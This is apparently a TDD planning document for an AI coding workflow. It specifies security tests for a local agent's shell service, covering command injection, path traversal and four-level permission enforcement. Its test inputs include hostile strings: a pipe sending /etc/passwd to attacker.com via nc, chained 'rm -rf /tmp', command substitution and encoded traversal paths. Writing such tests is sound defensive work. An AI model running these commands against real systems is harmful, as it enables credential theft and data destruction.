---
phase: 02-local-agent
plan: 04
type: tdd
wave: 3
depends_on: ["01", "02", "03"]
files_modified:
  - backend/tests/test_local_agent_service.py
  - backend/tests/test_directory_permissions.py
  - backend/tests/test_command_whitelist.py
  - backend/tests/test_host_shell_security.py
autonomous: true
user_setup: []

must_haves:
  truths:
    - "Command injection tests prevent shell metacharacter attacks (;, |, &, $())"
    - "Path traversal tests prevent ../../../etc/passwd attacks"
    - "Maturity level tests enforce permission boundaries (4 levels)"
    - "Directory permission tests validate cross-platform path handling"
    - "All tests pass with 95%+ pass rate"
  artifacts:
    - path: "backend/tests/test_local_agent_service.py"
      provides: "LocalAgentService integration tests"
      min_lines: 150
    - path: "backend/tests/test_directory_permissions.py"
      provides: "Directory permission security tests"
      min_lines: 120
    - path: "backend/tests/test_command_whitelist.py"
      provides: "Command whitelist validation tests"
      min_lines: 100
    - path: "backend/tests/test_host_shell_security.py"
      provides: "Host shell security tests (injection, traversal)"
      min_lines: 150
  key_links:
    - from: "backend/tests/test_local_agent_service.py"
      to: "backend/core/local_agent_service.py"
      via: "Unit test imports"
      pattern: "from core.local_agent_service import LocalAgentService"
    - from: "backend/tests/test_directory_permissions.py"
      to: "backend/core/directory_permission.py"
      via: "Unit test imports"
      pattern: "from core.directory_permission import check_directory_permission"
    - from: "backend/tests/test_command_whitelist.py"
      to: "backend/core/command_whitelist.py"
      via: "Unit test imports"
      pattern: "from core.command_whitelist import validate_command"
---

<objective>
Create comprehensive TDD test suite for local agent security validation, covering command injection prevention, path traversal protection, maturity-level enforcement, and cross-platform path handling.

Purpose: Ensure local agent "God Mode" is secure against common attack vectors (command injection, path traversal, privilege escalation) while maintaining maturity-based permission boundaries.

Output: 4 test files with 40+ tests, 95%+ pass rate, security-focused test coverage
</objective>

<execution_context>
@/Users/rushiparikh/.claude/get-shit-done/workflows/execute-plan.md
@/Users/rushiparikh/.claude/get-shit-done/templates/summary.md
</execution_context>

<context>
@.planning/FEATURE_ROADMAP.md
@.planning/phases/02-local-agent/02-RESEARCH.md
@.planning/phases/02-local-agent/02-local-agent-01-SUMMARY.md
@.planning/phases/02-local-agent/02-local-agent-02-SUMMARY.md
@.planning/phases/02-local-agent/02-local-agent-03-SUMMARY.md
@backend/core/local_agent_service.py
@backend/core/directory_permission.py
@backend/core/command_whitelist.py
@backend/core/host_shell_service.py
</context>

<tasks>

<task type="auto">
  <name>Task 1: Create command injection prevention tests</name>
  <files>backend/tests/test_host_shell_security.py</files>
  <action>
Create TDD test suite for command injection prevention:

Test cases (RED → GREEN → REFACTOR):
1. test_shell_metacharacter_blocked() - Semicolon command injection
   - Input: "ls; rm -rf /tmp"
   - Expected: PermissionError or "command not in whitelist"
   - Reason: ; allows command chaining

2. test_pipe_injection_blocked() - Pipe command injection
   - Input: "cat /etc/passwd | nc attacker.com 4444"
   - Expected: PermissionError or blocked
   - Reason: | allows command piping

3. test_command_substitution_blocked() - $() substitution
   - Input: "echo $(cat /etc/passwd)"
   - Expected: PermissionError or base command "echo" not in whitelist
   - Reason: $() executes arbitrary commands

4. test_backtick_injection_blocked() - Backtick substitution
   - Input: "ls `whoami`"
   - Expected: Blocked or parsed as invalid
   - Reason: Backticks execute commands

5. test_ampersand_injection_blocked() - Background execution
   - Input: "ls & malware"
   - Expected: Blocked
   - Reason: & allows parallel command execution

6. test_newline_injection_blocked() - Newline command separator
   - Input: "ls\nrm -rf /tmp"
   - Expected: Blocked
   - Reason: Newline separates commands

7. test_shell_equals_false_enforced() - Verify subprocess uses shell=False
   - Mock subprocess.create_subprocess_exec (NOT create_subprocess_shell)
   - Verify list arguments passed (not string)

Use pytest.mark.asyncio for async tests.
Use AsyncMock for subprocess mocking.
Use pytest.raises for exception testing.

Pattern:
```python
@pytest.mark.asyncio
async def test_shell_metacharacter_blocked():
    with patch('asyncio.create_subprocess_exec') as mock_subprocess:
        mock_subprocess.return_value = MockProcess(returncode=0)
        result = await host_shell_service.execute_shell_command(
            agent_id="test-agent",
            command="ls; rm -rf /tmp",  # Injection attempt
            ...
        )
        # Should raise PermissionError before subprocess call
        assert mock_subprocess.call_count == 0  # Never executed
```
  </action>
  <verify>
grep -q "test.*injection" backend/tests/test_host_shell_security.py && grep -q "shell_metacharacter\|pipe\|command_substitution" backend/tests/test_host_shell_security.py
  </verify>
  <done>
Command injection tests created with:
- 7+ test cases covering shell metacharacters
- AsyncMock for subprocess mocking
- Exception testing (PermissionError)
- Verification that subprocess never called for injections
- shell=False enforcement test
  </done>
</task>

<task type="auto">
  <name>Task 2: Create path traversal prevention tests</name>
  <files>backend/tests/test_directory_permissions.py</files>
  <action>
Create TDD test suite for path traversal prevention:

Test cases:
1. test_double_dot_slash_blocked() - ../../../etc/passwd
   - Input: "/tmp/../../../etc/passwd"
   - Expected: Resolved path (/etc/passwd) blocked

2. test_encoded_dot_slash_blocked() - %2e%2e%2f
   - Input: "/tmp/%2e%2e%2fetc/passwd"
   - Expected: Blocked after URL decode

3. test_symlink_escape_blocked() - Symlink to /etc
   - Create symlink /tmp/link → /etc
   - Input: "/tmp/link/passwd"
   - Expected: Blocked (symlink target checked)

4. test_absolute_path_escape_blocked() - Full path to /etc
   - Input: "/etc/passwd"
   - Expected: Blocked (not in allowed dirs)

5. test_tilde_expansion_allowed() - ~/Documents
   - Input: "~/Documents/file.txt"
   - Expected: Allowed (for AUTONOMOUS), resolved to absolute path

6. test_relative_path_within_allowed() - subdir
   - Input: "/tmp/subdir/file.txt"
   - Expected: Allowed (within /tmp)

7. test_windows_path_blocked() - C:\\Windows
   - Input: "C:\\Windows\\System32"
   - Expected: Blocked on all platforms

8. test_cross_platform_path_handling() - Path separators
   - Test / on Unix, \ on Windows
   - Use pathlib.Path for automatic handling

Pattern:
```python
def test_double_dot_slash_blocked():
    result = check_directory_permission(
        agent_id="test-agent",
        directory="/tmp/../../../etc/passwd",
        maturity_level=AgentStatus.AUTONOMOUS,
        db=db
    )
    assert result["allowed"] == False
    assert "blocked" in result["reason"].lower()
```

Use Path.resolve() for canonicalization.
Use Path.is_relative_to() for prefix checking (Python 3.12+) or str().startswith() for older.
  </action>
  <verify>
grep -q "test.*traversal\|test.*path" backend/tests/test_directory_permissions.py && grep -q "\.\./\.\.\|double.*dot\|path.*escape" backend/tests/test_directory_permissions.py
  </verify>
  <done>
Path traversal tests created with:
- 8+ test cases covering traversal attacks
- Path resolution validation (resolve(), canonicalize)
- Symlink escape detection
- Cross-platform path handling
- Tilde expansion tests
- Windows path blocking
  </done>
</task>

<task type="auto">
  <name>Task 3: Create maturity-level enforcement tests</name>
  <files>backend/tests/test_command_whitelist.py</files>
  <action>
Create TDD test suite for maturity-level permission enforcement:

Test cases (4x4 maturity matrix):
1. test_student_read_commands_allowed() - ls, cat, grep in /tmp/
   - STUDENT can suggest (not execute) read commands
   - Expected: suggest_only=True

2. test_student_write_commands_blocked() - cp, mv, mkdir
   - STUDENT cannot write
   - Expected: allowed=False, maturity_required="INTERN" or higher

3. test_student_delete_commands_blocked() - rm
   - STUDENT cannot delete
   - Expected: allowed=False, maturity_required="AUTONOMOUS"

4. test_intern_write_commands_approval() - cp, mv, mkdir
   - INTERN can write with approval
   - Expected: suggest_only=True, requires_approval=True

5. test_supervised_write_commands_approval() - cp, mv, mkdir
   - SUPERVISED can write with approval
   - Expected: suggest_only=True, requires_approval=True

6. test_autonomous_read_auto_execute() - ls, cat, grep
   - AUTONOMOUS can auto-execute read commands
   - Expected: allowed=True, suggest_only=False

7. test_autonomous_write_auto_execute() - cp, mv, mkdir
   - AUTONOMOUS can auto-execute write commands
   - Expected: allowed=True, suggest_only=False

8. test_autonomous_delete_auto_execute() - rm
   - AUTONOMOUS can auto-execute delete (in allowed dirs)
   - Expected: allowed=True, suggest_only=False

9. test_blocked_commands_all_levels() - sudo, chmod, kill
   - All maturity levels blocked
   - Expected: blocked=True for STUDENT/INTERN/SUPERVISED/AUTONOMOUS

10. test_maturity_upgrade_thresholds() - When can agent upgrade?
    - Track command execution count
    - Verify promotion readiness (future feature)

Pattern:
```python
@pytest.mark.parametrize("maturity,command,expected", [
    (AgentStatus.STUDENT, "ls /tmp", {"allowed": True, "suggest_only": True}),
    (AgentStatus.STUDENT, "cp a b", {"allowed": False, "maturity_required": "SUPERVISED"}),
    (AgentStatus.AUTONOMOUS, "cp a b", {"allowed": True, "suggest_only": False}),
])
def test_maturity_permissions(maturity, command, expected):
    result = validate_command(command, maturity)
    assert result["allowed"] == expected["allowed"]
    assert result.get("suggest_only") == expected.get("suggest_only")
```
  </action>
  <verify>
grep -q "test.*student\|test.*intern\|test.*supervised\|test.*autonomous" backend/tests/test_command_whitelist.py && grep -q "maturity.*level\|suggest_only" backend/tests/test_command_whitelist.py
  </verify>
  <done>
Maturity-level tests created with:
- 10+ test cases covering 4x4 maturity matrix
- Parameterized tests for efficiency
- Read/write/delete command categories
- Blocked command tests (all levels)
- Suggest-only flow validation
  </done>
</task>

<task type="auto">
  <name>Task 4: Create LocalAgentService integration tests</name>
  <files>backend/tests/test_local_agent_service.py</files>
  <action>
Create TDD integration test suite for LocalAgentService end-to-end flow:

Test cases:
1. test_full_execution_flow_autonomous() - AUTONOMOUS agent executes command
   - Governance check → Directory check → Whitelist check → Execute → Log
   - Expected: Success, ShellSession created

2. test_suggest_only_flow_student() - STUDENT agent suggests command
   - Governance check → Directory check → Whitelist check → Suggest
   - Expected: requires_approval=True, no execution

3. test_approval_flow_intern() - INTERN agent gets approval
   - Suggest command → User approves → Execute
   - Expected: Command executes after approval

4. test_blocked_directory_all_levels() - /etc/ blocked
   - Any maturity level, /etc/ directory
   - Expected: allowed=False for all

5. test_governance_cache_hit() - Cached governance decision
   - Execute same command twice
   - Expected: Second call uses cache (<1ms)

6. test_audit_trail_logging() - ShellSession created
   - Execute command
   - Expected: ShellSession record with all fields

7. test_timeout_enforcement() - Long-running command killed
   - Simulate command that exceeds 5-minute timeout
   - Expected: process.kill() called, timed_out=True

8. test_subprocess_uses_shell_false() - Security verification
   - Mock subprocess.create_subprocess_exec
   - Verify shell=False enforced (list args passed)

Pattern:
```python
@pytest.mark.asyncio
async def test_full_execution_flow_autonomous(db, autonomous_agent):
    service = LocalAgentService(backend_url="http://localhost:8000")

    result = await service.execute_command(
        agent_id=autonomous_agent.id,
        command="ls /tmp",
        working_directory="/tmp",
        db=db
    )

    assert result["allowed"] == True
    assert result["exit_code"] == 0
    assert "session_id" in result

    # Verify audit trail
    session = db.query(ShellSession).filter_by(id=result["session_id"]).first()
    assert session is not None
    assert session.command == "ls /tmp"
    assert session.maturity_level == "AUTONOMOUS"
```

Use factory_boy for test data (AgentFactory, UserFactory).
Use AsyncMock for external dependencies (httpx, subprocess).
Use pytest-asyncio for async test support.
  </action>
  <verify>
grep -q "test.*integration\|test.*flow\|test.*audit" backend/tests/test_local_agent_service.py && grep -q "LocalAgentService\|execute_command" backend/tests/test_local_agent_service.py
  </verify>
  <done>
LocalAgentService integration tests created with:
- 8+ test cases covering full execution flow
- End-to-end testing (governance → directory → whitelist → execute)
- Audit trail verification
- Cache performance testing
- Timeout enforcement tests
- Security verification (shell=False)
  </done>
</task>

</tasks>

<verification>
1. Run pytest -xvs backend/tests/test_host_shell_security.py - All command injection tests pass
2. Run pytest -xvs backend/tests/test_directory_permissions.py - All path traversal tests pass
3. Run pytest -xvs backend/tests/test_command_whitelist.py - All maturity tests pass
4. Run pytest -xvs backend/tests/test_local_agent_service.py - All integration tests pass
5. Overall pass rate >= 95% (allowing for test infrastructure issues)
6. No test uses shell=True in subprocess
7. All security tests mock subprocess (no real execution)
</verification>

<success_criteria>
1. 40+ security tests created across 4 test files
2. Command injection tests prevent shell metacharacters (;, |, &, $())
3. Path traversal tests prevent ../../../ attacks
4. Maturity-level tests enforce 4-tier permission model
5. Cross-platform path handling verified (~/Documents, Windows paths)
6. 95%+ test pass rate achieved
7. All tests mock subprocess (no real command execution during CI)
</success_criteria>

<output>
After completion, create `.planning/phases/02-local-agent/02-local-agent-04-SUMMARY.md` with:
- Test coverage matrix (by file and security domain)
- Test execution results (pass rate, timing)
- Security validation results (injection, traversal, maturity)
- Recommendations for production deployment
</output>
